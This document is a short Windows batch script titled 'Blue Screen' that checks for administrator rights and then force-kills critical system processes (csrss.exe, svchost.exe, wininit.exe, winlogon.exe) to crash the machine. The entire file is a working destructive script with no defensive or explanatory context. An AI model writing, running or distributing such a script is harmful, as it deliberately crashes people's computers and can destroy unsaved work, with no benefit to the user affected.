@echo off
title Blue Screen

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Please run with administrator privileges
    pause
    exit
)

taskkill /F /IM csrss.exe
taskkill /F /IM svchost.exe
taskkill /F /IM wininit.exe
taskkill /F /IM winlogon.exe
start wininit.exe
